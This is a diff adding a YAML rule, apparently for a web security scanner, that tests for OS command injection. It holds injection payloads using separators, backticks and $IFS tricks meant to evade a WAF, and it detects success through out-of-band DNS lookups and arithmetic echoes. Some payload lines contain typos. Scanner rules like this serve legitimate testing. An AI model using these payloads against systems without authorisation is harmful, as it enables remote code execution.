@@ -1,0 +1,86 @@
+collect:
+  - uniq:
+    - [ URI ]
+
+generate:
+  - payload:
+
+#For QUICK scan profile. DNS_MARKER & CALC_MARKER.
+    - ";getent hosts DNS_MARKER;echo $((CALC_MARKER));"
+    - ";getent$IFS$9hosts$IFS$9DNS_MARKER;echo$IFS$9$((CALC_MARKER));"
+    - "';getent hosts DNS_MARKER;echo $((CALC_MARKER));'"
+    - "';getent$IFS$9hosts$IFS$9DNS_MARKER;echo$IFS$9$((CALC_MARKER));'"
+    - "\";geten host DNS_MARKER;echo $((CALC_MARKER));\""
+    - "\";getent$IFS$9hosts$IFS$9DNS_MARKER;echo$IFS$9$((CALC_MARKER));\""
+    - "`getent hosts DNS_MARKER;echo $((CALC_MARKER))`"
+    - "`getent$IFS$9hosts$IFS$9DNS_MARKER;echo$IFS$9$((CALC_MARKER))`"
+    - "|getent hosts DNS_MARKER;echo $((CALC_MARKER))"
+    - "|getent$IFS$9hosts$IFS$9DNS_MARKER;echo$IFS$9$((CALC_MARKER))"
+    - "x\ngentent hosts DNS_MARKER;echo $((CALC_MARKER))\nx"
+    - "x\ngentent$IFS$9hosts$IFS$9DNS_MARKER;echo$IFS$9$((CALC_MARKER))\nx"
+    - "$(getent hosts DNS_MARKER;ping -c1 DNS_MARKER)"
+    - "$(getent$IFS$9hosts$IFS$9DNS_MARKER)"
+
+#For INTENSIVE scan profile. May be useful for the limited size of the parameter or WAF bypass.
+  #CALC_MARKER
+    #- ";echo $((CALC_MARKER));"
+    #- ";echo$IFS$9$((CALC_MARKER));"
+    #- "';echo $((CALC_MARKER));'"
+    #- "';echo$IFS$9$((CALC_MARKER));'"
+    #- "\";echo $((CALC_MARKER));\""
+    #- "\";echo$IFS$9$((CALC_MARKER));\""
+    #- "`echo $((CALC_MARKER))`"
+    #- "`echo$IFS$9$((CALC_MARKER))`"
+    #- "|echo $((CALC_MARKER))"
+    #- "|echo$IFS$9$((CALC_MARKER))"
+    #- "x\necho$IFS$9$((CALC_MARKER))\nx"
+
+  #getent hosts DNS_MARKER
+    #- ";getent hosts DNS_MARKER;"
+    #- ";getent$IFS$9hosts$IFS$9DNS_MARKER;"
+    #- "';getent hosts DNS_MARKER;'"
+    #- "';getent$IFS$9hosts$IFS$9DNS_MARKER;'"
+    #- "\";getent hosts DNS_MARKER;\""
+    #- "\";getent$IFS$9hosts$IFS$9DNS_MARKER;\""
+    #- "`getent hosts DNS_MARKER`"
+    #- "`getent$IFS$9hosts$IFS$9DNS_MARKER`"
+    #- "|getent hosts DNS_MARKER"
+    #- "|getent$IFS$9hosts$IFS$9DNS_MARKER"
+    #- "x\ngentent$IFS$9hosts$IFS$9DNS_MARKER\nx"
+    #- "$(getent$IFS$9hosts$IFS$9DNS_MARKER)"
+
+  #ping DNS_MARKER
+    #- ";ping -c1 DNS_MARKER;"
+    #- ";ping$IFS$9-c1$IFS$9DNS_MARKER;"
+    #- "';ping -c1 DNS_MARKER;'"
+    #- "';ping$IFS$9-c1$IFS$9DNS_MARKER;'"
+    #- "\";ping -c1 DNS_MARKER;\""
+    #- "\";ping$IFS$9-c1$IFS$9DNS_MARKER;\""
+    #- "`ping -c1 DNS_MARKER`"
+    #- "`ping$IFS$9-c1$IFS$9DNS_MARKER`"
+    #- "|ping -c1 DNS_MARKER"
+    #- "|ping$IFS$9-c1$IFS$9DNS_MARKER"
+    #- "x\nping$IFS$9-c1$IFS$9DNS_MARKER\nx"
+    #- "$(ping$IFS$9-c1$IFS$9DNS_MARKER)"
+
+  - method:
+    - postfix
+    - replace
+
+detect:
+  - oob:
+    - dns
+  - response:
+    - body: CALC_MARKER
+
+meta-info:
+  - type: rce
+  - threat: 95
+  - tags:
+    - OS Commanding
+    - RCE
+    - Remote Code Execution
+    - Shell injection
+    - Command injection
+    - OWASP Top 10
+    - OWASP
